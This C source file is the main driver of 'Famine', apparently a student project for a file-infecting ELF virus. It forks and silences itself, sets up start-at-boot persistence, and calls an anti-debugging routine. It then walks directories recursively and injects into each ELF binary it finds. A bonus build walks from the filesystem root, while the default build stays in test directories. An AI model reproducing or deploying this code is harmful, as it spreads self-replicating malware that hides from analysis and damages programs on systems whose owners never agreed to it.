#include <famine.h>

void famine(char *fullpath, void *input, int woody_init_ok) {
    FamineFile *file = famine_elf_file_get(fullpath);
    if (file != NULL) {
        DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
        famine_injection(file, input, woody_init_ok);
        destroy_famine_file(file);
    } else {
        LOG(L_ERROR, "Failed to load ELF file.\n");
    }
}

void famine_process_recurcive(const char *path, void *input, int woody_init_ok) {
    struct dirent *entry = NULL;
    char fullpath[PATH_MAX] = {};
    struct stat st = {};

    DIR *dir = opendir(path);
    if (!dir)  {
        DBG("%s is not a directory\n", path);
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (!ft_strcmp(entry->d_name, ".") || !ft_strcmp(entry->d_name, "..")) {
            continue;
        }

        if (!ft_strcmp(path, "/")) {
            snprintf(fullpath, sizeof(fullpath), "/%s", entry->d_name);
        } else {
            snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
        }

        if (lstat(fullpath, &st) == -1 || S_ISLNK(st.st_mode)) {
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            famine_process_recurcive(fullpath, input, woody_init_ok);
        } else {
            famine(fullpath, input, woody_init_ok);
        }
    }

    closedir(dir);
}

void famine_main(void *input, int woody_init_ok) {
    pid_t pid = fork();
    if (pid == 0) {
        if (*get_log_level() == L_NONE) {
            mute_output();
        }
        int lock_fd = lock_global();

        setup_boot_start();
        exit_if_process_running();
        #ifdef FAMINE_BONUS
            char *root_path = getenv("FAMINE_ROOT_PATH");
            if (root_path) {
                famine_process_recurcive(root_path, input, woody_init_ok);
            } else {
                famine_process_recurcive("/", input, woody_init_ok);
            }
        #else
            famine_process_recurcive(TMPTEST_PATH, input, woody_init_ok);
            famine_process_recurcive(TMPTEST2_PATH, input, woody_init_ok);
        #endif
        close(lock_fd);
    }
    wait(NULL);
}

int main(int argc, char **argv) {
    set_log_level(L_DEBUG);
    // set_log_level(L_NONE);
    anti_debug();

    (void)argc, (void)argv;

    #ifdef FAMINE_BONUS
        UserInput	input = {0};
        int         woody_init_ok = TRUE;
        int 		ret = 0;
	    input.key_len = KEY_LEN;
		ret = woody_bonus_init(argv, &input, argc);
		if (!ret) {
            woody_init_ok = FALSE;
        }
        famine_main(&input, woody_init_ok);
        input_destroy(&input);
    #else
        famine_main(NULL, FALSE);
    #endif
    return (0);
}
